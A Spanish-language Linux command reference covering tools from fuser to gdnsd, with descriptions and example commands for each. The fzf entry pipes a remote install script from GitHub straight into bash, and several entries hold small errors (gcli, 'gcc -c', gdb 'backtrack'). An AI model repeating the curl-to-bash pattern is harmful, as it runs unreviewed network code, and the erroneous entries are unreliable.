$ fuser -v archivo  (Muestra los procesos usados por un fichero o directorio)
# fuser -n tcp -s 22 && echo "abierto" (Indica si un puerto está abierto)


fusermount
[Filesystem in Userspace-FUSE]. El sistema de archivos en el espacio de usuario [FUSE] es un método seguro para que usuarios sin privilegios creen y monten sus propias implementaciones de sistemas de archivos.
# fusermount -o /media/punto_montaje (montar un sistema de archivos)
# fusermount -z /media/punto_montaje (Desmontar el sistema de archivos tan pronto como deje de usarse)
# fusermount -u /media/punto_montaje (Desmonta un sistema de archivos)


fusioninventory-agent
Aplicación diseñada para realizar seguimiento de las configuraciones de hardware y software de los dispositivos. Funciona en segundo plano, recolectando datos y enviándolos automáticamente al servidor configurado, usualmente un servidor GLPI [Gestionnaire Libre de Parc Informatique] con el plugin FusionInventory. GLPI es un paquete de software de gestión de activos y TI que proporciona funciones de ITIL Service Desk, seguimiento de licencias y auditoría de software. La aplicación recopila información de hardware: CPU, RAM, discos, red, etc. y software: sistemas operativos, programas instalados, licencias, etc.
# fusioninventory-agent --server http://mi-servidor-glpi/plugins/fusioninventory/ (inventario manual y enviarlo al servidor GLPI)
# fusioninventory-agent --debug (ver en detalle los pasos que realiza el agente, útil para solucionar problemas de comunicación o configuración)
# fusioninventory-agent --local=/ruta/salida/inventario.xml (ejecutar el inventario y guardar el resultado en un archivo local, sin enviarlo al servidor)


fuzz
Pruebas de estrés [fuzz testing] en programas introduciendo datos aleatorios o malformados para detectar vulnerabilidades, fallos o comportamientos inesperados. El proxy para inyectar datos aleatorios es zzuf [ver]
$ zzuf -r 0.1 -s 1234 ./mi_programa < entrada.txt (modifica el 10% de los bytes de entrada y semilla aleatoria para reproducibilidad)
$ zzuf -r 0.2 -- curl http://localhost:8080/?param=test (altera la URL aleatoriamente para ver si el servidor responde correctamente)
$ afl-fuzz -i input_dir -o output_dir ./programa_test (mutación guiada para encontrar bugs)


fuzzyocr
plugin para SpamAssassin que ayuda a detectar spam en imágenes utilizando reconocimiento óptico de caracteres [OCR]. Su propósito principal es analizar archivos adjuntos de imágenes en formatos GIF, JPEG o PNG para buscar palabras clave que suelen aparecer en mensajes de spam. En un servidor de correo, FuzzyOCR se ejecuta automáticamente cuando SpamAssassin procesa los mensajes entrantes, añadiendo puntuaciones de spam a los mensajes con imágenes sospechosas.
Configuración básica
# nano /etc/mail/spamassassin/v310.pre
Y añadir la línea:
         loadplugin Mail::SpamAssassin::Plugin::FuzzyOcr
$ spamassassin -D fuzzyocr --lint (probar el funcionamiento)
$ spamassassin -D fuzzyocr < mensaje_sospechoso.eml (analizar un correo específico)


fwanalog
Analiza y resume los archivos de registro del firewall.
# fwanalog /ruta/al/firewall.log (analizará el archivo firewall.log y generará un informe en HTML para abrir con el navegador)


fwlogwatch
Analizador de registros. Los mensajes en /var/log/messages y la configuración en /etc/fwlogwatch.config en el que se han de descomentar los conceptos que interesen aunque muchos se pueden habilitar lanzando la aplicacion con argumentos. Incluye los ejecutables fwlw_notify y fwlw_respond. Un ejemplo de configuración:
           stateful_start = yes
           bind_to = 127.0.0.1
           listen_port = 888
           show_log_times
# fwlogwatch
# fwlogwatch -w -o log.html
# fwlogwatch -v -b -t -e -z -w -o fwlogw.html
# fwlogwatch -v -n -N -b -t -e -z -w -o fwlogw.html


fwsnort
Traduce las reglas de Snort en reglas de iptables equivalentes y genera un script de shell que implementa los comandos de iptables resultantes. La generación de scripts en modo de registro, los errores de análisis escritos en el archivo de registro de fwsnort y la verificación de políticas de iptables están habilitados de forma predeterminada sin tener que especificar ningún argumento de línea de comando.
# fwsnort (traducir las reglas de Snort)
# fwsnort -6 (Generar reglas de ip6tables para ataques a través de IPv6)
# fwsnort --include-type ddos,backdoor (Generar reglas de iptables solo para ddos y backdoors)
# fwsnort --snort-sid 2008475,2003268 (Genere reglas de iptables para los ID de Snort 2008475 y 2003268 (de emergente-all.rules))
# fwsnort --restrict-intf eth0,eth1 (indicar que solo inspeccione el tráfico eth0 y eth1)
# fwsnort --ipt-sync --verbose (Generar reglas de iptables para Snort que estan permitidas por la política local de iptables y escribir las de snort originales en el script de iptables como comentario)


fwupd
Demonio que permite que el software de sesión actualice el firmware del dispositivo.
# fwupdmgr get-devices (mostrar todos los dispositivos detectados)
# fwupdmgr refresh (descargar metadatos recientes del Linux Vendor firmware Service [Servicio de firmware del proveedor de Linux]-LVFS)
# fwupdmgr get-updates (enumerar las actualizaciones disponibles para cualquier dispositivo en el sistema)
# fwupdmgr update (instalar actualizaciones)
# fwupdmgr report-history (enviar información a los administradores de LVFS y a los desarrolladores OEM sobre la eficacia del proceso de actualización del firmware)
fwupd-test


fzf
[buscador difuso "fuzzy finder"]. Realizar búsquedas en cualquier tipo de listas que se le ofrezca como entrada, ya sean archivos, historial de comandos o procesos.  Descarga e instalación [preferible a la de los repositorios de la distro]:
$ curl -o- https://raw.githubusercontent.com/junegunn/fzf/master/install | bash
$ fzf (lanza la aplicación de forma básica)
$ history | fzf (abre una interfaz interactiva donde puedes buscar y seleccionar un comando anterior en el historial)
$ ls | fzf (buscar y seleccionar archivos en el directorio actual)
$ ps aux | fzf (muestra los procesos activos y permite buscar o seleccionar uno)
$ find . -type f | fzf (con find, buscar y seleccionar archivos en subdirectorios)
$ find . -name "*.sh" | fzf (encontrar archivos por extensión)
$ git checkout $(git branch | fzf) (muestra una lista de ramas y permite buscar la que se quiere cambiar)


fzy
Es un selector de texto difuso rápido y sencillo para la terminal con un algoritmo de puntuación avanzado. Su utilidad principal es permitirte buscar y seleccionar interactívamente entre una lista de opciones, como archivos, comandos o cualquier texto, con una interfaz minimalista y eficiente.
La búsqueda difusa (fuzzy search) no necesita que se escriba exactamente el texto que se está buscando. Por ejemplo, con una lista de archivos:
$ ls pruebas
     documento_final.txt
     docu_borrador.txt
     resumen.doc
     finanzas_2023.xlsx
$ ls | fzy -q df
Mostrará documento_final.txt, porque las letras están en orden y se parecen a lo que se está buscando, aunque no sea una coincidencia exacta. Si hay varias posibilidades, las mostrará y se selecciona la que proceda.
$ find . -type f | fzy (muestra todos los archivos del directorio actual y subdirectorios)
$ cat $(find . -type f | fzy) (permite elegir un archivo y luego lo muestra con cat)
$ history | fzy (buscar entre comandos recientes de shell para volver a ejecutarlos)


g++
compilador GNU C++.
$ g++ file.cpp (compila y vincula file.cpp para generar un ejecutable predeterminado a.out)
$ g++ -o ejecutable file.cpp (compilar y vincular file.pp a "ejecutable". Lanzar con ./ejecutable)


g15daemon
Multiplexor LCD para teclado Logitech G15 que roporciona múltiples pantallas virtuales para la pantalla LCD del teclado Logitech G15 y los altavoces Z10. También permite el uso de todas las teclas adicionales de los teclados G11 y G15, incluso si el kernel no las admite.
$ g15daemon (arrancar el servicio)


gallery-dl
Programa para descargar galerías y colecciones de imágenes desde varios sitios de alojamiento de imágenes.
$ gallery-dl --list-modules (listado de módulos)
$ gallery-dl --list-extractors (Imprime una lista de clases de extractores con descripción, [sub]categoría y URL de ejemplo)
$ gallery-dl https://aryion.com/g4/gallery/jameshoward (descargar serie de imagenes)


galleta
es una herramienta forense que examina el contenido de las cookies generadas por MicroSoft Internet Explorer [MSIE]. Analiza el archivo y genera un campo separado que puede cargarse en una hoja de cálculo.
$ galleta -t FD archivo (cambia el delimitador de campo predeterminado [TAB] a FD del archivo de cookies para analizar)


gamin
Demonio para monitorizar cambios en el sistema de archivos, que permite a las aplicaciones detectar cuándo un archivo o directorio ha sido añadido, eliminado o modificado. Por ejemplo, si un administrador de archivos muestra un directorio al usuario y este elimina uno de los archivos, Gamin notificará al administrador sobre este cambio para que pueda actualizar la visualización del directorio. Gamin ha sido diseñado como un reemplazo directo de FAM [File Alteration Monitor], priorizando la seguridad y la facilidad de mantenimiento, y puede utilizar el servicio avanzado inotify de Linux cuando esté disponible. En la mayoría de los casos, gamin se ejecuta como un servicio del sistema, y las aplicaciones lo usan indirectamente mediante llamadas a su API. Es decir, no es algo que se suela ejecutar directamente desde línea de comandos.
1.-
Ejemplo práctico usando fam [cliente de gamin] para ver notificaciones de cambios
$ mkdir ~/prueba_gamin(crea un directorio de prueba)
$ famcat ~/prueba_gamin (usa famcat para monitorizar, queda esperando)
En otra terminal, crear o modificar archivos dentro del directorio:
$touch ~/prueba_gamin/archivo1.txt
$ echo "hola" >> ~/prueba_gamin/archivo1.txt
$ rm ~/prueba_gamin/archivo1.txt
En la terminal de famcat, se verán mensajes como:
BEGIN MONITORING /home/tu_usuario/prueba_gamin
       CREATE archivo1.txt
       CHANGE archivo1.txt
       DELETE archivo1.txt


ganeti
Herramienta de gestión de clústeres de servidores virtuales basada en las tecnologías de virtualización Xen, KVM y, en algunos casos, LXC. Proporciona un entorno automatizado para gestionar instancias de máquinas virtuales de alta disponibilidad. Está diseñado para facilitar la gestión de clústeres de servidores virtuales que utilizan hardware estándar y para proporcionar una recuperación rápida y sencilla tras fallos físicos.
# gnt-cluster init --vg-name=vg_ganeti --default-iaas=xen --nic-parameters link=xenbr0 cluster1.com (inicializa el clúster en el nodo principal con un grupo de volúmenes llamado vg_ganeti y un bridge xenbr0
# gnt-node list (ver los nodos físicos que componen el clúster)
# gnt-node add venus.example.com (añadir un nuevo nodo al cluster que ha de tener Ganeti instalado, el hostname configurado y las claves SSH regeneradas)
# gnt-instance add -t plain -o debootstrap+default --disk 0:size=10g -m 1024 -n marte.example.com minmei.example.com (crear una máquina virtual usando debootstrap que instala un sistema base))
Los argumentos:
       - -t plain: Usa almacenamiento LVM (sin DRBD).
       - -o debootstrap+default: Instala un sistema Debian base.
       - --disk 0:size=10g: Crea un disco de 10 GB.
       - -m 1024: Asigna 1 GB de RAM.
       - -n marte.example.com: Nodo donde se alojará la instancia.
       - minmei.example.com: Nombre de la instancia.
# gnt-instance startup minmei.example.com (iniciar una instancia)
# gnt-instance shutdown minmei.example.com (detenerla)
# gnt-instance reboot minmei.example.com (reiniciarla)
# gnt-instance console minmei.example.com (acceder a la consola de una instancia)
# gnt-instance migrate minmei.example.com (migrar una instancia a otro nodo [failover])
# gnt-instance failover -n venus.example.com minmei.example.com (mover la instancia al nodo venus.example.com)
# gnt-instance grow-disk minmei.example.com sda 2g (aumentar el tamaño del disco de la instancia a 12 GB. Ha de reiniciarse)
# gnt-instance modify -m 128 minmei.example.com (cambiar la memoria a 128 MB. Los cambios se aplican tras reiniciar la instancia)
# gnt-instance remove minmei.example.com (eliminar una máquina virtual)
# gnt-instance list (listar instancias en el clúster)
# gnt-instance modify -H vnc_bind_address= minmei.example.com (optimizar parámetros como VNC)
# gnt-instance modify -H mouse_type= minmei.example.com (optimizar parámetros como el ratón)
1.-
Conceptos clave de Ganeti
          - Nodo: Servidor físico que forma parte del clúster y aloja máquinas virtuales.
          - Instancia: Máquina virtual gestionada por el clúster.
          - Clúster: Conjunto de nodos coordinados para ejecutar y gestionar instancias.
          - Comandos principales: Los comandos de Ganeti comienzan con gnt-, como gnt-cluster, gnt-node, gnt-instance, etc.


gant
Herramienta de construcción [build tool] que permite definir y automatizar tareas de compilación usando scripts escritos en Groovy, en lugar de los tradicionales archivos XML de Apache Ant. Gant combina la potencia de Ant y su ecosistema de tareas con la flexibilidad y expresividad de Groovy como lenguaje de scripting.
$ gant -T (listar los targets disponibles)
1.-
Como ejemplo básico, crear un archivo build.gant como una tarea sencilla que imprima un mensaje
$ nano build.gant
       groovy
       target(sayHello: "Saying hello") {
           Ant.echo(message: "Hola Mundo desde Gant")
       }
       setDefaultTarget(sayHello)
$ gant (ejecutar el script donde esté build.gant, siempre es el predeterminado)
Si se definen varios targets, se ejecutan por nombre:
$ gant -v -f build2.gant (ejecutar build2.gant en modo verbose)


gappa
Herramienta para ayudar a verificar propiedades matemáticas, en particular en programas que utilizan aritmética de punto flotante o fijo, como en simulaciones científicas, cálculos numéricos, etc. Permite especificar expresiones matemáticas, normalmente relacionadas con errores de redondeo y demuestra automáticamente que ciertas propiedades se cumplen usando técnicas de intervalos y razonamiento formal.
1.-
Ejemplo para verificar una prueba formal de la propiedad
$ nano ejemplo.g
       { c in [-0.3,-0.1] /\
         (2 * a in [3,4] -> b + c in [1,2]) /\
         a - c in [1.9,2.05]
         -> b + 1 in [2,3.5] }
$ gappa ejemplo.g
2.-
Ejemplo
$ echo "{ x in [-2,2] -> x * x in ? }" > ejemplo.gappa
$ gappa -Bcoq ejemplo.g > test.v (genera un script que comprueba la fórmula lógica en test.v)
        Results:
          x * x in [0, 4]
$ gappa -Bnull ejemplo.g (mismo ejemplo sin generar el script. Es el predeterminado)
3.-
Ejemplo con un error
$ echo "{ 1 + 1 = 3 }" | gappa
        Error: some properties were not satisfied:
          EQL(1 + 1, 3)
$ echo "Return code is $?"
        Return code is 1


garmin-forerunner-tools
Herramientas para recuperar datos de dispositivos GPS Garmin, especialmente las series Forerunner, dispositivos similares a relojes de pulsera que permiten registrar el itinerario exacto al practicar deportes al aire libre y datos específicos como velocidad máxima, resumen de vueltas, consumo de calorías, etc. Funciona con los modelos Forerunner 205 y 305, así como con el Edge 305 y posiblemente otros. Los datos de recorrido se pueden convertir a formato XML, a GPX y a formato de polilínea para su uso con Google Maps.
$ garmin_get_info (ver información básica del dispositivo)
$ garmin_save_runs -t guardar/ (exportar todos los entrenamientos a archivos TCX. Creará archivos como actividad_20230415_142345.tcx para cada entrenamiento)
$ garmin_gpx -o ruta_carrera.gpx (exportar una ruta específica a formato GPX para aplicaciones como Strava, Google Earth o Garmin Basecamp)
$ garmin_dump > datos_brutos.txt (extraer datos en bruto para diagnóstico)
$ garmin_save_waypoints -l  (listar waypoints [puntos de interés])
$ garmin_save_waypoints -w mis_puntos.wpt (extraer waypoints)
Nota.- Existen herramientas más modernas como gpsbabel [más universal para dispositivos GPS], python-ant-downloader [para dispositivos con ANT+] y las propias herramientas de Garmin [Garmin Express]


gawk
Es la implementación del proyecto GNU del lenguaje de programación AWK [ver].


gawkbug
Es un script de shell para ayudar al usuario a redactar y enviar informes de errores relacionados con gawk en un formato estándar. gawkbug invoca el editor especificado por la variable de entorno EDITORs.
$ gawkbug (El usuario debe completar los campos correspondientes y salir del editor)
$ gawkbug correo (envía por correo el informe completo a bug-gawk@gnu.org, o a la dirección de correo que se especifique)
Nota.-  Si el informe no se puede enviar por correo, se guarda en el archivo dead.gawkbug en el directorio del usuario que invoca.


gawk-doc
Información en inglés del comando gawk. Acceder a la misma con el navegador con la dirección:
	file:///usr/share/doc/gawk-doc/gawkworkflow-html/index.html


gcal
Muestra un calendario mensual, anual, días festivos, fechas fijas, etc.
$ gcal (muestra el mes actual)
$ gcal 2025 (el año actual o año especificado)
$ gcal --year 2025 (lo mismo)
$ gcal 2025/05 (muestra el calendario de mayo del 2025)
$ gcal --usage=ARG (muestra todos los posibles argumentos del comando)
$ gcal --month 6 (el junio del presente año)
$ gcal --month 6 --year 2026 (junio del 2026)
$ gcal --year 2023 --type holiday (ver los días festivos de un año)
$ gcal --type fixed_dates (ver las fechas fijas programadas)


gcalccmd
Calculadora.
$ gcalccmd (Entra en el prompt y se teclea por ejemplo 5*4 y dará el resultado)


gcalcli
Aplicación de Python que permite interractuar con Google Calendar del usuario para ver la agenda diaria, semanal o mensual, añadir, eliminar o modificar eventos, etc. Además, puede utilizarse como servicio de recordatorios para ejecutar cualquier aplicación que se desee. Precisa autenticación con la cuenta de Google.
$ gcalcli agenda (ver los eventos de hoy)
$ gcalcli agenda --days 7 (ver eventos de una semana)
$ gcalcli calw 4 (ver 4 semanas - CALendar Week)
$ gcalcli calm (ver el calendario mensual - CALendar Month)
$ gcalcli add (abrirá una serie de prompts interactivos para introducir título, hora, fecha, etc)
$ gcalcli add --title "Reunión con equipo" --where "Oficina" --when "2025-04-23 14:00" --duration 1 --description "Planificación de sprint" (o hacerlo con una sola línea)
$ gcalcli search "Reunión" (buscar eventos)
$ gcalcli delete (eliminar un evento)


gcalctool
Calculadora.
$ gcalctool -s 5*4/2+5


gcc
(GNU Compiler Collections). Compilador de lenguaje C y C++.
$ gcc source.c (compilará source.c y creará el archivo a.out de salida)
$ gcc -c archivo.c (genera una biblioteca)
$ gcc programa.c -o programa_compilado (crea el ejecutable)
$ gcc -x c archivo (Especificando el lenguaje para compilar [c])
$ gcc source.c -W -o linux (Compilará mostrando advertencias y errores y creará la salida linux)
Nota.-la ejecución de la salida será de forma clásica en linux: ./linux


gcli
Herramienta que permite interactuar con Git, como Gitea, GitLab y Microsoft® GitHub con operaciones comunes como clonar, crear, actualizar y gestionar ramas, etc.
$ gcli clone https://github.com/username/repo.git (clona un repositorio desde GitHub a la máquina local)
$ gcli branch new feature-branch (crear una nueva rama)
$ gcli pull origin main (actualizar la rama actual)
$ gcli commit -m "Añado nueva función" && gcli push origin main (hacer commit y push)
$ gcli remote add upstream https://github.com/original-repo.git (configurar remoto con gcli)
$ gcli status (proporcionar información sobre el estado del repositorio)
$ gcli resolve-conflicts (resolver conflictos durante un merge o rebase)
$ gcli tag create v1.0.0 (crear tags)
$ gcli tag list (lista de tags)
$ gcli rm file.txt (eliminar archivos de seguimiento)
$ gcli diff (verificar los cambios antes de hacer un commit)


gconftool-2
[gconf-editor]. Configurador de todos los parámetros de gnome
$ gconftool-2 --dump / > gconf_backup.xml  (realizar copia de seguridad de la configuración)
$ gconftool-2 --load gconf_backup.xml /  (restablecer la copia de seguridad)
$ gconftool-2 --recursive-unset /apps/panel (recuperar los paneles originales)
nota.- sustituiendo el “/apps/panel” por cualquier ruta del árbol de directorios [por ejemplo “/”] de gconf-editor pueden restaurarse sus valores originales
$ rm -rf .gconf/apps/panel (borra toda la configuración extra de los paneles)
$ gconftool-2 –shutdown && rm -rf ~/.gconf/apps/panel && pkill gnome-panel (velver a una configuración anterior de los paneles)
Notas:
	-t (tipo de datos a utilizar. Los valores son {int|bool|float|string|list|pair})
	-s (entrada a modificar)
Los valores de –type pueden ser:
lógicos [bool]. Cuando el parámetro puede ser verdadero [true] o falso [false]. P.e quitar papelera del escritorio:
$ gconftool-2 -t bool -s /apps/nautilus/desktop/trash_icon_visible false
Enteros (int). Cuando ha de especificarse un número. P.e. aumentar el numero de escritorios a 5:
$ gconftool-2 -t int -s /apps/metacity/general/num_workspaces 5
reales (float). Cuando el valor tiene el punto como separador decimal. p.e el contraste de cheese:
$ gconftool-2 -t float -s /apps/cheese/contrast 1.2
Cadenas (string). Cuando ha de especificarse un texto. P.e. cambiar el nombre de la carpeta de usuario:
$ gconftool-2 -t string -s /apps/nautilus/desktop/home_icon_name "Mi carpeta"
Lista de valores (list). En muchos casos va complementado con otra lista (--list-type) que admite los valores {int|bool|float|string}. p.e detectar codificación en gedit con determinadas opciones:
$ gconftool-2 -t list --list-type string -s /apps/gedit-2/preferences/encodings/auto_detected [UTF-8,CURRENT,ISO-8859-15,UTF-16]
Parejas de valores [pairs]. Indica parejas de valores de los tipos anteriores. No he encontrado ningún ejemplo


gcovr
Herramienta que automatiza la recolección y el resumen de información de cobertura de código generada por gcov, la utilidad de GNU para analizar cobertura en programas compilados con GCC. Su propósito es facilitar la generación de informes de cobertura, ayudando a identificar qué partes del código han sido ejecutadas durante las pruebas y cuáles no.
$ gcovr -r . (genera un resumen en la consola de las líneas ejecutadas)
$ gcovr -r . --html -o cobertura.html (genera un informe HTML resumido)
$ gcovr -r . --html --html-details -o cobertura_detallada.html (genera un informe HTML con detalles)
$ gcovr -r . --branches (muestra cobertura de ramas en vez de solo líneas)
$ gcovr --gcov-executable gcov-8 (asegura que se use la versión correcta de gcov según el compilador empleado)
$ gcovr -r . --xml -o cobertura.xml (generar informe en otros formatos)


gcp
Copiar archivos y directorios mostrando barra de progreso.
$ gcp archivo dir (Copiar un archivo en un directorio)
$ gcp file1 file2 file3 dir (Copiar varios archivos en un directorio)
$ gcp -r dir1 dir2 (Copiar de forma recursiva)
$ gcp -f -r dir1 dir2 (Copiar forzando sopbreescritura si ya existe el archivo)


gcpegg
[Global Consciousness Project EGG software]. El GCP es un experimento científico que busca detectar posibles patrones no aleatorios en generadores de números aleatorios [RNGs] distribuidos por todo el mundo, que podrían estar influenciados por eventos que afectan la conciencia colectiva, como grandes catástrofes, celebraciones masivas, etc. La hipótesis es que eventos globales impactantes como el 11-S o grandes eventos deportivos podrían alterar la aleatoriedad de estos generadores debido a una supuesta "conciencia colectiva".
$ gcpegg --submit --host gcp-server.org --port 1234 (que los datos generados se enviarán al servidor, dirección del servidor GCP y puerto de conexión)
$ gcpegg --local --output random_data.txt (generar datos aleatorios sin enviarlos)
$ gcpegg --bits 1024 --interval 60 (cantidad de bits aleatorios generados por muestra y tiempo en segundos entre cada muestra)


gdb
Herramienta para depurar programas en C y C++
Necesitamos que el programa haya sido compilado con modo debug (parámetro -g) en gcc o g++
$ gdb /ruta/programa (Con esto abrimos la shell de GDB)
Dentro de la Shell de GDB podemos ejecutar comandos
(gdb) run (ejecutara el programa sin argumentos)
(gdb) run < content.xml > test.txt (Con argumentos, ejemplo de o3totxt)
(gdb) break 10 (Decimos a GDB que queremos un punto de control en la linia 10 del código)
(gdb) print variable (También p. Nos printara el contenido de la variable)
(gdb) continue (Tambien c. Decimos que el programa continue ejecutándose)
(gdb) next 	(También n. Ejecuta la siguiente linia de código)
(gdb) step (También s. Lo mismo que next pero si la siguiente linia es una función, va a dicha función y ejecuta linia a linia el código de esa función)
(gdb) [TECLA_ENTER] (Repite el paso anterior)
(gdb) backtrack (Printa la traza inversa)
(gdb) help (ayuda del programa)
(gdb) quit (salimos del programa)


gdbmtool
Utilidad de línea de comandos que permite crear, examinar y modificar bases de datos GDBM [GNU dbm], que almacenan pares clave/valor en un archivo, proporcionando una versión persistente del tipo de dato abstracto "diccionario" o "hash" como en Perl. Incluye las siguientes herramientas de línea de comandos: gdbm_dump: volcar el contenido de la base de datos a un formato independiente del sistema, gdbm_load: recrear la base de datos a partir del volcado creado por gdbm_dump y gdbmtool: ver y modificar una base de datos existente o crear una nueva.
$ gdbmtool  (entra en modo interactivo donde se pueden introducir comandos para manipular la base de datos9
$ gdbmtool mi_base.gdbm (abrirá o creará el archivo mi_base.gdbm y mostrará un prompt interactivo)
Ejemplo de prompt interactivo
$ gdbmtool mi_base.gdbm
           gdbmtool> store usuario1 Juan
           gdbmtool> store usuario2 Maria
           gdbmtool> fetch usuario1
           Juan
           gdbmtool> list
           usuario1
           usuario2
           gdbmtool> delete usuario1
           gdbmtool> list
           usuario2
           gdbmtool> quit
Comandos principales en gdbmtool
     store: Guarda un par clave/valor.
     fetch: Recupera el valor asociado a una clave.
     delete: Elimina un par clave/valor.
     list: Lista todas las claves almacenadas.
     quit: Sale de la herramienta.
$ gdbm_dump mi_base.gdbm > respaldo.dump (exporta el contenido de una base de datos a un archivo de texto)
$ gdbm_load -r -n respaldo.dump mi_base_restaurada.gdbm (restaura una base de datos a partir de un volcado, -r reemplazar entradas existentes, -n para no restaurar metadatos)


gdbserver
Programa que permite depurar aplicaciones en una máquina remota o incluso en la misma máquina, usando GNU Debugger. Lo que hace es ejecutar un programa objetivo y comunicarse con gdb a través de una red [TCP] o incluso por un puerto serie. Actualmente, gdb es compatible con C, C++, D, Objective-C, Fortran, Java, OpenCL C, Pascal, ensamblador, Modula-2, Go y Ada.
$ gdbserver localhost:1234 ./mi_programa (iniciará mi_programa y lo detendrá inmediatamente, esperando que un GDB se conecte a través del puerto 1234 en localhost)
1.-
Supongamos un programa llamado saludo.c
$ gcc -g saludo.c -o saludo (compilar con información de depuración)
$ gdbserver localhost:1234 ./saludo (iniciar gdbserver)
Saldrá algo como:
       Process ./saludo created; pid = 12345
       Listening on port 1234
En otra terminal, abrir gdb
$ gdb saludo
      (gdb) target remote localhost:1234
Ahora se pueden usar comandos como:
      (gdb) break main         # Poner un punto de ruptura en main
      (gdb) continue           # Continuar ejecución
      (gdb) step               # Ejecutar línea a línea
      (gdb) print nombre       # Ver el valor de variables
$ gdbserver 192.168.1.100:1234 ./saludo (estando en otra máquina)


gdbus
Herramienta para trabajar con objetos D-Bus [Desktop Bus], un sistema de comunicación entre procesos [IPC] que permite que diferentes aplicaciones se comuniquen entre sí en un entorno de escritorio o servidor, por ejemplo que un reproductor de música notifique a la barra de tareas que está reproduciendo una canción, o gestionar el brillo de la pantalla, el volumen, la red... D-Bus organiza la comunicación en objetos, que son entidades que exponen métodos [Funciones que pueden ser llamadas remotamente], señales [Eventos que notifican cambios o acciones] y propiedades [Valores que pueden ser leídos o modificados]. Cada objeto tiene una ruta [path] única, como /org/freedesktop/NetworkManager que podría exponer un método GetDevices para listar dispositivos de red, o emitir una señal DeviceAdded cuando se conecta un nuevo dispositivo.
$ ls /usr/share/dbus-1/services/ (ver todos los servicios disponibles)
$ gdbus introspect --system --dest org.freedesktop.NetworkManager --object-path /org/freedesktop/NetworkManager (inspeccionar los métodos, señales, propiedadesd del objeto de NetworkManager. Genera un xml con la información)
$ gdbus call --system --dest org.freedesktop.NetworkManager --object-path /org/freedesktop/NetworkManager --method org.freedesktop.NetworkManager.GetDevices (listar dispositivos de red)
$ gdbus monitor --system --dest org.freedesktop.NetworkManager (monitorear NetworkManager en tiempo real y ver las interacciones con el objeto)
$ gdbus wait --system org.freedesktop.NetworkManager (espera a que un servicio esté disponible en el bus)


gddrescue
Herramienta, desarrollada por GNU, de recuperación de datos de dispositivos de almacenamiento dañados como discos duros, USB, CD/DVD, etc. A diferencia de dd [ver], gddrescue es inteligente: si encuentra errores, no se detiene, sino que registra las zonas problemáticas y sigue copiando el resto de los datos. Luego puede reintentar las zonas dañadas con diferentes estrategias.
# ddrescue -f -n /dev/sda disco_rescatado.img mapa.log (-f: fuerza la operación, necesario si el destino es un archivo, -n: Modo "no scrap" que evita operaciones agresivas en la primera pasada, disco dañado. imagen de destino y archivo de registro)
# ddrescue -d -r3 /dev/sda disco_rescatado.img mapa.log (acceso directo al disco, ignora caché, más preciso para sectores dañados y reintenta 3 veces los sectores erróneos)
# ddrescue -n /dev/sda /dev/sdb logfile (recuperar solo los sectores que no se han leído correctamente)
# ddrescue -f /dev/sdb /dev/sdc mapa.log (clonar un disco dañado a otro disco sanosdb el dañado y sdc el de destino de igual o superior tamaño)
# ddrescue -C /dev/sda disco_rescatado.img mapa.log (continuar un rescate interrumpido desde el último progreso registrado en mapa.log)
# ddrescue -d -A /dev/sda disco_rescatado.img mapa.log (modo "agresivo" para rescatar sectores muy dañados. -A: "Try hard" lee sectores con tamaños de bloque pequeños).
# ddrescue -v -l 5 /dev/sdX /dev/sdY logfile (limitar el número de intentos de lectura a 5 para cada sector y con la máxima información)
Nota.- En discos muy dañados, el proceso puede tardar horas o días.


gdebi
Instalador de paquetes .deb
# gdebi paquete.deb


gdisk
Herramienta para particionar discos rígidos de cualquier tamaño con una tabla de particiones GPT de GUID (Globally Unique Identifier) imprescindible para los discos mayores de 2 TB. Para el caso de discos rígidos SSD, por defecto gdisk asegura que sus particiones estén correctamente alineadas [discos duros que no tienen 512 bytes por sectors]. El uso de particiones GPT, elimina la necesidad de basarse en particiones primarias, extendidas o lógicas propias del sistema MBR. GPT puede soportar un número casi ilimitado de particiones y tiene solamente el límite de la cantidad de espacio reservado para las entradas de las particiones en el disco GPT, por defecto gdisk tiene un límite 128 particiones.
# gdisk /dev/sda
Algunos comandos:
	i (información de las particiones)
	l (listar particiones)
	m (volver al menú principal)
	d (borrar partición)
	n (crear nueva partición)
	o (crear nueva tabla de particiones GUID)
	t (cambiar tipo de partición)
	c (cambiar de partición)
	q (salir guardando los cambios)
	? (mostar menú de opciones)


gdm
Pantalla de login para entrar en el sistema
1-
Para ocultar usuarios:
Aparecen en la pantalla de login los que tienen un ID 1000 o superior. Para conocer los ID:
# cat /etc/passwd | gawk -F: '{print $3, $1}' | sort -n
Para suprimirlos:
# nano /etc/gdm/custom.conf
Y el apartado greeter dejarlo:
[greeter]
Exclude=usuario_a_ocultar,boinc,yacy
2.-
Entrada automática y otros ajustes:
# gdmsetup
3.-
Cambiar fondo en la pantalla de login.
# nano /etc/gdm3/greeter.gsettings
Y modificando la linea "pictori-uri" para que apunte a la imagen deseada:
	[org.gnome.desktop.background]
	picture-uri='file:///path/a/fondo'
	picture-options='zoom'
Una vez modificado, aplicar los cambios con:
# dpkg-reconfigure gdm3


gdnsd
Servidor de nombres de dominio autoritativo con capacidades avanzadas de balanceo de carga, redirección y conmutación por error, teniendo en cuenta la ubicación geográfica de los clientes o el estado de los servicios. Este paquete proporciona el demonio principal de gdnsd y los complementos básicos. Un servidor DNS autoritativo es el responsable de dar respuestas directas a las consultas sobre los registros DNS de un dominio específico. En otras palabras, si alguien pregunta por la dirección IP de mi-dominio.com, uno de los servidores autoritativos configurados para ese dominio tendrá la respuesta definitiva.
1.-
Balanceo de Carga Geográfico Básico
Ejemplo con 3 servidores web replicados en diferentes ubicaciones geográficas: Nueva York, Londres y Tokio y que los usuarios sean dirigidos al servidor más cercano para obtener una mejor velocidad de carga. Configuración del Archivo de Zona: En el archivo de zona del dominio mi-dominio.com, se definiría varios registros A para www.mi-dominio.com y gdnsd utilizará los plugins de geolocalización para decidir cuál de estas IPs devolver en función de la ubicación del cliente que realiza la consulta y generalmente se hace en el archivo de configuración de gdnsd (típicamente en /etc/gdnsd/).
     www.mi-dominio.com. IN A 192.168.1.10  ; Servidor en Nueva York
     www.mi-dominio.com. IN A 192.168.2.20  ; Servidor en Londres
     www.mi-dominio.com. IN A 192.168.3.30  ; Servidor en Tokio
Lo que haría que las consultas provenientes de Norteaméric se dirijan al servidor 192.168.1.10, para Europa, al 192.168.2.20, y para Asia, al 192.168.3.30.
2.-
Conmutación por Error Consciente del Estado del Servicio
Suponiendo dos servidores de correo (mail.mi-dominio.com) y si el servidor primario falla, dirigir automáticamente el trafico al secundario definiendo los registros MX para los servidores de correo.
     mail.mi-dominio.com. IN MX 10 mail1.mi-dominio.com.
